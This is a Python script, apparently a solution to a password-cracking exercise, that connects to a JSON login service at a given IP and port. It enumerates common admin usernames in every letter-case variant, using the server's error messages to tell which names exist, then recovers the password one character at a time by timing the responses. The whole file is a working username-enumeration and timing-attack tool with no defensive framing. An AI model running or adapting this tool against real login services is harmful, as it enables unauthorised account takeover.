import argparse
import json
import socket
import string
from datetime import datetime

logins = [
    'admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1', 'user2', 'root', 'default', 'new_user',
    'some_user', 'new_admin', 'administrator', 'Administrator', 'superuser', 'super', 'su', 'alex',
    'suser', 'rootuser', 'adminadmin', 'useruser', 'superadmin', 'username', 'username1'
]


def case_variants(word):
    if len(word) <= 1:
        yield word.lower()
        yield word.upper()
    else:
        lower = word[0].lower()
        upper = word[0].upper()

        for variant in case_variants(word[1:]):
            yield lower + variant
            if lower != upper:
                yield upper + variant


def gen_logins():
    for word in logins:
        for login in case_variants(word):
            yield login


def find_login(client):
    credentials = {'password': ''}

    for login in gen_logins():
        credentials['login'] = login
        client.send(json.dumps(credentials).encode())
        response = json.loads(client.recv(128))

        if response['result'] in ("Wrong password!", "Exception happened during login"):
            return login

    return None


def gen_passwords(guess):
    for ch in string.printable:
        yield guess + ch


def find_credentials(client, login, guess=""):
    if login is None:
        return None

    credentials = {'login': login}
    for pwd in gen_passwords(guess):
        credentials['password'] = pwd

        start = datetime.now()
        client.send(json.dumps(credentials).encode())
        response = json.loads(client.recv(128))
        finish = datetime.now()

        result = response['result']

        if result == "Connection success!":
            return credentials
        elif (finish - start).microseconds > 1000:
            return find_credentials(client, login, pwd)
        elif result == "Too many attempts":
            return None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('ip')
    parser.add_argument('port', type=int)
    args = parser.parse_args()

    with socket.socket() as client:
        client.connect((args.ip, args.port))
        print(json.dumps(find_credentials(client, find_login(client))))


if __name__ == "__main__":
    main()
